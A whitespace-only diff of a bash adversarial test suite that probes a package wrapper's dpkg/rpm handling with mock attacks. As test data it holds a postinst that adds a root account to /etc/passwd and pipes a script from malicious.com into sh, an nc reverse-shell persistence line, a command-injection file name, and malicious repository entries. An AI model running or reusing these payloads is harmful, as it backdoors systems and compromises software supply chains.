@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
 
 # ⚠️  DANGER: ADVERSARIAL PACKAGE INSTALLATION TEST SUITE ⚠️
-# 
+#
 # This test suite attacks package manager integration to find vulnerabilities.
 # It actively exploits dpkg/rpm installation and removal processes.
-# 
+#
 # ⚠️  WARNING: This test is UNSAFE and should ONLY be run in:
 #   - Isolated development environments
 #   - Dedicated testing containers
@@ -106,19 +106,19 @@ export CI=1
 # Create isolated test environment
 setup_adversarial_env() {
     local test_home="/tmp/fplaunch-package-adversarial-test-$$"
-    
+
     # Clean up any existing test directory
     rm -rf "$test_home"
-    
+
     # Create test directory structure with attack surfaces
     mkdir -p "$test_home"/{bin,var/lib/dpkg,var/lib/rpm,etc,usr/bin,usr/share/doc/fplaunchwrapper,attack-vectors}
-    
+
     # Override environment for test isolation
     export HOME="$test_home"
     export XDG_CONFIG_HOME="$test_home/.config"
     export XDG_DATA_HOME="$test_home/.local/share"
     export PATH="$test_home/bin:$PATH"
-    
+
     # Create malicious dpkg command that logs attacks
     cat > "$test_home/bin/dpkg" << 'EOF'
 #!/usr/bin/env bash
@@ -187,7 +187,7 @@ case "$1" in
 esac
 EOF
     chmod +x "$test_home/bin/dpkg"
-    
+
     # Create malicious rpm command that logs attacks
     cat > "$test_home/bin/rpm" << 'EOF'
 #!/usr/bin/env bash
@@ -243,12 +243,12 @@ case "$1" in
 esac
 EOF
     chmod +x "$test_home/bin/rpm"
-    
+
     # Create attack log
     touch "$test_home/attack-log.txt"
 
     TEST_HOME="$test_home"
-    
+
     echo "$test_home"
 }
 
@@ -268,9 +268,9 @@ trap '[[ -n "${TEST_HOME:-}" ]] && cleanup_adversarial_env "$TEST_HOME"' EXIT IN
 # ATTACK 1: Malicious package installation
 test_malicious_package_installation() {
     local test_home="$1"
-    
+
     attack "Malicious package installation attacks"
-    
+
     # Test 1: Try to install package with path traversal
     local output
     output=$("$test_home/bin/dpkg" --install "../../../etc/malicious.deb" 2>&1 || true)
@@ -279,7 +279,7 @@ test_malicious_package_installation() {
     else
         fail "Path traversal in package installation not blocked"
     fi
-    
+
     # Test 2: Try to install package with command injection
     output=$("$test_home/bin/dpkg" --install "package.deb; rm -rf /tmp/*" 2>&1 || true)
     if echo "$output" | grep -q "path traversal detected"; then
@@ -287,7 +287,7 @@ test_malicious_package_installation() {
     else
         fail "Command injection in package installation not blocked"
     fi
-    
+
     # Test 3: Try to install malicious RPM
     output=$("$test_home/bin/rpm" -i "../../../etc/malicious.rpm" 2>&1 || true)
     if echo "$output" | grep -q "path traversal detected"; then
@@ -300,9 +300,9 @@ test_malicious_package_installation() {
 # ATTACK 2: Privilege escalation through package scripts
 test_privilege_escalation_attacks() {
     local test_home="$1"
-    
+
     attack "Privilege escalation through package scripts"
-    
+
     # Create malicious postinst script
     cat > "$test_home/malicious-postinst" << 'EOF'
 #!/bin/bash
@@ -313,7 +313,7 @@ echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null || true
 curl -s http://malicious.com/backdoor.sh | sh 2>/dev/null || true
 EOF
     chmod +x "$test_home/malicious-postinst"
-    
+
     # Test 1: Try to execute malicious postinst
     local output
     output=$("$test_home/malicious-postinst" 2>&1 || true)
@@ -322,7 +322,7 @@ EOF
     else
         fail "Malicious postinst script execution not blocked"
     fi
-    
+
     # Create malicious prerm script
     cat > "$test_home/malicious-prerm" << 'EOF'
 #!/bin/bash
@@ -334,7 +334,7 @@ echo "nc -l 4444 -e /bin/sh &" >> /tmp/.backdoor/persist.sh
 chmod +x /tmp/.backdoor/persist.sh
 EOF
     chmod +x "$test_home/malicious-prerm"
-    
+
     # Test 2: Try to execute malicious prerm
     output=$("$test_home/malicious-prerm" 2>&1 || true)
     if [ $? -ne 0 ]; then
@@ -347,9 +347,9 @@ EOF
 # ATTACK 3: Package database poisoning
 test_package_database_poisoning() {
     local test_home="$1"
-    
+
     attack "Package database poisoning attacks"
-    
+
     # Test 1: Try to poison dpkg status file
     local output
     output=$(echo "Package: malicious
@@ -362,7 +362,7 @@ Version: 1.0.0
 Description: Malicious package with backdoor
  This package contains a backdoor that allows remote access.
 " >> "$test_home/var/lib/dpkg/status" 2>&1 || true)
-    
+
     if [ $? -eq 0 ]; then
         # Check if poisoned package is detected
         output=$("$test_home/bin/dpkg" -s malicious 2>&1 || true)
@@ -374,10 +374,10 @@ Description: Malicious package with backdoor
     else
         defense "Package database modification blocked"
     fi
-    
+
     # Test 2: Try to poison RPM database
     output=$(echo "malicious|1.0.0|1|x86_64|Backdoor Package|Attacker|Malicious package with backdoor|/var/lib/rpm" >> "$test_home/var/lib/rpm/Packages" 2>&1 || true)
-    
+
     if [ $? -eq 0 ]; then
         # Check if poisoned package is detected
         output=$("$test_home/bin/rpm" -q malicious 2>&1 || true)
@@ -394,13 +394,13 @@ Description: Malicious package with backdoor
 # ATTACK 4: Repository hijacking attacks
 test_repository_hijacking_attacks() {
     local test_home="$1"
-    
+
     attack "Repository hijacking attacks"
-    
+
     # Test 1: Try to create malicious sources.list
     local output
     output=$(echo "deb http://malicious.com/ stable main" > "$test_home/etc/apt/sources.list.d/malicious.list" 2>&1 || true)
-    
+
     if [ $? -eq 0 ]; then
         # Check if malicious repository is detected/blocked
         if [ ! -f "$test_home/etc/apt/sources.list.d/malicious.list" ]; then
@@ -411,14 +411,14 @@ test_repository_hijacking_attacks() {
     else
         defense "Repository file creation blocked"
     fi
-    
+
     # Test 2: Try to create malicious yum repo
     output=$(echo "[malicious]
 name=Malicious Repository
 baseurl=http://malicious.com/packages/
 enabled=1
 gpgcheck=0" > "$test_home/etc/yum.repos.d/malicious.repo" 2>&1 || true)
-    
+
     if [ $? -eq 0 ]; then
         # Check if malicious repo is detected/blocked
         if [ ! -f "$test_home/etc/yum.repos.d/malicious.repo" ]; then
@@ -434,9 +434,9 @@ gpgcheck=0" > "$test_home/etc/yum.repos.d/malicious.repo" 2>&1 || true)
 # ATTACK 5: Package signature spoofing
 test_package_signature_spoofing() {
     local test_home="$1"
-    
+
     attack "Package signature spoofing attacks"
-    
+
     # Create fake package with malicious signature
     mkdir -p "$test_home/attack-vectors/fake-package"
     cat > "$test_home/attack-vectors/fake-package/DEBIAN/control" << 'EOF'
@@ -450,7 +450,7 @@ Description: Fake fplaunchwrapper with backdoor
  This is a fake version of fplaunchwrapper that contains
  a backdoor allowing remote access to the system.
 EOF
-    
+
     # Test 1: Try to install fake package
     local output
     output=$("$test_home/bin/dpkg" --install "$test_home/attack-vectors/fake-package" 2>&1 || true)
@@ -459,7 +459,7 @@ EOF
     else
         fail "Fake package installation not blocked"
     fi
-    
+
     # Create fake RPM package
     mkdir -p "$test_home/attack-vectors/fake-rpm"
     cat > "$test_home/attack-vectors/fake-rpm/fake.spec" << 'EOF'
@@ -481,7 +481,7 @@ chmod +x %{buildroot}/usr/bin/fplaunchwrapper
 %files
 /usr/bin/fplaunchwrapper
 EOF
-    
+
     # Test 2: Try to install fake RPM
     output=$("$test_home/bin/rpm" -i "$test_home/attack-vectors/fake-rpm" 2>&1 || true)
     if echo "$output" | grep -q "error"; then
@@ -494,9 +494,9 @@ EOF
 # ATTACK 6: Dependency confusion attacks
 test_dependency_confusion_attacks() {
     local test_home="$1"
-    
+
     attack "Dependency confusion attacks"
-    
+
     # Test 1: Try to create malicious dependency
     local output
     output=$("$test_home/bin/dpkg" --install "malicious-dep.deb" 2>&1 || true)
@@ -505,7 +505,7 @@ test_dependency_confusion_attacks() {
     else
         fail "Malicious dependency installation not blocked"
     fi
-    
+
     # Test 2: Try to install malicious RPM dependency
     output=$("$test_home/bin/rpm" -i "malicious-dep.rpm" 2>&1 || true)
     if echo "$output" | grep -q "path traversal detected"; then
@@ -518,13 +518,13 @@ test_dependency_confusion_attacks() {
 # ATTACK 7: Supply chain attacks
 test_supply_chain_attacks() {
     local test_home="$1"
-    
+
     attack "Supply chain attacks"
-    
+
     # Test 1: Try to modify package during installation
     local output
     output=$(mkdir -p "$test_home/tmp-override" && echo "MALICIOUS OVERRIDE" > "$test_home/tmp-override/hijack" 2>&1 || true)
-    
+
     if [ $? -eq 0 ]; then
         # Try to use override in package installation
         output=$("$test_home/bin/dpkg" --install "package.deb" 2>&1 || true)
@@ -536,7 +536,7 @@ test_supply_chain_attacks() {
     else
         defense "Override creation blocked"
     fi
-    
+
     # Test 2: Try to intercept package installation
     output=$(PATH="$test_home/attack-vectors:$PATH" "$test_home/bin/dpkg" -l fplaunchwrapper 2>&1 || true)
     if [ $? -eq 0 ]; then
@@ -561,11 +561,11 @@ main() {
     echo -e "${PURPLE}ADVERSARIAL Package Installation Test Suite${NC}"
     echo -e "${PURPLE}======================================${NC}"
     echo ""
-    
+
     # Setup adversarial test environment
     local test_home
     test_home=$(setup_adversarial_env)
-    
+
     # Run adversarial attacks
     test_malicious_package_installation "$test_home"
     test_privilege_escalation_attacks "$test_home"
@@ -574,11 +574,11 @@ main() {
     test_package_signature_spoofing "$test_home"
     test_dependency_confusion_attacks "$test_home"
     test_supply_chain_attacks "$test_home"
-    
+
     # Cleanup
     cleanup_adversarial_env "$test_home"
     TEST_HOME=""
-    
+
     # Results
     echo ""
     echo -e "${PURPLE}======================================${NC}"
@@ -588,7 +588,7 @@ main() {
     echo -e "${RED}Tests Failed: $FAILED${NC}"
     echo -e "${GREEN}Attacks Blocked: $ATTACKS_BLOCKED${NC}"
     echo -e "${RED}Vulnerabilities Found: $VULNERABILITIES_FOUND${NC}"
-    
+
     if [ $VULNERABILITIES_FOUND -eq 0 ]; then
         echo -e "${GREEN}All package attacks blocked! System appears secure.${NC}"
         exit 0
